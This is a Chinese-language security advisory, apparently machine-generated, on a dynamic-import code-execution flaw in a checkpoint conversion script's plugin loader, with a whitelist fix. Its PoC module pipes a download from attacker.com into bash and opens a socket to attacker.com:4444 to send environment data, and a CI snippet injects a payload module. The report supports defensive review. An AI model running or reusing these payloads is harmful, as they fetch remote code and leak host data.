# 深度利用分析报告: VULN-SEC-DYN-001

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-DYN-001 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |
| **严重性** | High |
| **置信度** | 85/100 |
| **位置** | `convert_ckpt.py:22-23` |
| **函数** | `load_plugin` |
| **模块** | checkpoint_conversion |

---

## 漏洞原理详解

### importlib.import_module 动态加载机制

Python 的 `importlib.import_module()` 可以动态加载任意模块。当模块名由用户输入构造时，可能导致加载恶意模块。

**核心原理**:
```python
module_name = f"{base}.{user_input}"  # 用户可控
plugin = importlib.import_module(module_name)  # 动态加载
# → 执行模块中的任意代码
```

---

## 漏洞代码

```python
# convert_ckpt.py:13-34

MODULE_ROOT = "mindspeed_llm.tasks.checkpoint"

def load_plugin(plugin_type, name):
    if name == '':
        module_name = f"{MODULE_ROOT}.{plugin_type}"
    else:
        module_name = f"{MODULE_ROOT}.{plugin_type}_{name}"
    
    try:
        plugin = importlib.import_module(module_name)  # 危险！用户控制 name
    except ModuleNotFoundError:
        module_name = f"{MODULE_ROOT}.{name}"
        try:
            plugin = importlib.import_module(module_name)
        except ModuleNotFoundError:
            sys.exit(f"Unable to load {plugin_type} plugin {name}. Exiting.")
    
    # 仅检查是否有 add_arguments 方法 - 任何模块都可以定义此方法
    if not hasattr(plugin, 'add_arguments'):
        sys.exit(f"{module_name} module is not a plugin. Exiting.")
    
    logger.info(f"Loaded {module_name} as the {plugin_type}.")
    return plugin

# 主函数中的调用
known_args, _ = parser.parse_known_args()
loader = load_plugin('loader', known_args.loader)  # --loader 参数
saver = load_plugin('saver', known_args.saver)    # --saver 参数
```

---

## 数据流分析

```
Source: CLI 参数 --loader/--saver
  ↓
argparse: parser.add_argument('--loader', type=str, default='megatron')
  ↓
known_args.loader
  ↓
load_plugin('loader', known_args.loader)
  ↓
module_name = f"mindspeed_llm.tasks.checkpoint.loader_{name}"
  ↓ [如果 name="evil"]
module_name = "mindspeed_llm.tasks.checkpoint.loader_evil"
  ↓
importlib.import_module(module_name)
  ↓ [SINK - 加载并执行模块代码]
恶意模块被执行 → RCE
```

---

## 攻击载荷构造 (PoC)

### Payload: 创建恶意 loader 模块

**前提条件**: 攻击者需要在项目中放置恶意模块文件

```python
# 创建文件: mindspeed_llm/tasks/checkpoint/loader_evil.py

import os
import socket

# 模块被导入时立即执行
os.system('curl attacker.com/backdoor.sh | bash')

# 建立反向连接
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
s.send(os.environ.keys().__str__().encode())

def add_arguments(parser):
    """必须定义此方法才能通过验证"""
    parser.add_argument('--evil-param', type=str, default='')

def load_checkpoint(model_provider, queue, args):
    """正常的 loader 逻辑"""
    pass
```

**执行攻击**:
```bash
python convert_ckpt.py --loader evil --model-type GPT --load-dir /any/path
# → importlib.import_module('mindspeed_llm.tasks.checkpoint.loader_evil')
# → 恶意代码执行
```

### Payload: CI/CD 管道注入

```yaml
# 恶意 CI 配置注入
steps:
  - name: Inject malicious loader
    run: |
      cat > mindspeed_llm/tasks/checkpoint/loader_pwned.py << 'EOF'
      import os
      os.system('id > /tmp/pwned')
      def add_arguments(p): pass
      def load_checkpoint(m, q, a): pass
      EOF
      
      python convert_ckpt.py --loader pwned --model-type GPT --load-dir /models
EOF
```

---

## 攻击场景描述

### 场景 1: CI/CD 管道污染

1. **攻击者**获得 CI pipeline 访问权限
2. 在构建过程中注入恶意 loader 模块
3. CI 自动执行 checkpoint 转换
4. 恶意模块被加载 → CI 环境被攻陷
5. 从 CI 环境渗透生产环境

### 场景 2: 内部威胁

1. 恶意内部人员在项目中放置恶意 loader 文件
2. 其他开发者执行 checkpoint 转换
3. `--loader` 使用恶意模块名
4. 开发环境被攻陷 → 窃取凭证/数据

### 场景 3: 供应链攻击

1. 攻击者 fork 项目并添加恶意 loader
2. 通过社会工程学诱导用户使用恶意 fork
3. 用户执行转换 → 系统被攻陷

---

## 利用条件

| 条件 | 是否满足 |
|------|----------|
| 用户可控模块名 | ✓ (--loader/--saver) |
| 无模块名白名单 | ✓ (任何名称都可以) |
| 仅检查 add_arguments | ✓ (容易绕过) |
| 需要放置恶意文件 | △ (需要其他攻击配合) |

**利用难度**: 中等 (需要在项目中放置恶意文件)

---

## Python importlib 安全限制

Python 的 `importlib.import_module()` 对模块名有一定限制:
- 不允许以 `.` 开头 (防止相对路径遍历)
- 必须是有效的 Python 标识符

**绕过方式**:
- 在预期目录下放置恶意文件
- 利用 CI/CD 管道注入
- 内部威胁直接放置

---

## 修复建议

### 立即修复 (High)

```python
# convert_ckpt.py 修复

# 定义允许的 loader/saver 白名单
ALLOWED_LOADERS = frozenset({
    'megatron', 'huggingface', 'hf', 'mg',
    'bloom', 'llama', 'mixtral', 'gptneox',
    'baichuan', 'qwen', 'aquila'
})

ALLOWED_SAVERS = frozenset({
    'megatron', 'huggingface', 'hf', 'mg'
})

def load_plugin_secure(plugin_type, name):
    """安全的插件加载"""
    
    # 1. 验证名称格式
    if not name:
        name = 'megatron'  # 默认值
    
    # 只允许字母数字下划线
    if not name.replace('_', '').isalnum():
        raise ValueError(f"Invalid plugin name: {name}")
    
    # 2. 白名单检查
    if plugin_type == 'loader':
        if name not in ALLOWED_LOADERS:
            raise ValueError(
                f"Unauthorized loader '{name}'. "
                f"Allowed: {sorted(ALLOWED_LOADERS)}"
            )
    elif plugin_type == 'saver':
        if name not in ALLOWED_SAVERS:
            raise ValueError(
                f"Unauthorized saver '{name}'. "
                f"Allowed: {sorted(ALLOWED_SAVERS)}"
            )
    else:
        raise ValueError(f"Invalid plugin type: {plugin_type}")
    
    # 3. 构造模块名
    if name == '':
        module_name = f"{MODULE_ROOT}.{plugin_type}"
    else:
        module_name = f"{MODULE_ROOT}.{plugin_type}_{name}"
    
    # 4. 加载
    try:
        plugin = importlib.import_module(module_name)
    except ImportError:
        raise ValueError(f"Plugin module not found: {module_name}")
    
    # 5. 验证接口
    if not hasattr(plugin, 'add_arguments'):
        raise ValueError(f"{module_name} is not a valid plugin")
    
    return plugin
```

---

## CVSS 评分预估

**CVSS 3.1**: **7.5 (High)**

| 指标 | 值 |
|------|-----|
| Attack Vector | Local (L) |
| Attack Complexity | Low (L) |
| Privileges Required | Low (L) |
| User Interaction | Required (R) |
| Scope | Unchanged (U) |
| Confidentiality | High (H) |
| Integrity | High (H) |
| Availability | High (H) |

---

**报告生成时间**: 2026-04-20  
**分析者**: Security Scanner Agent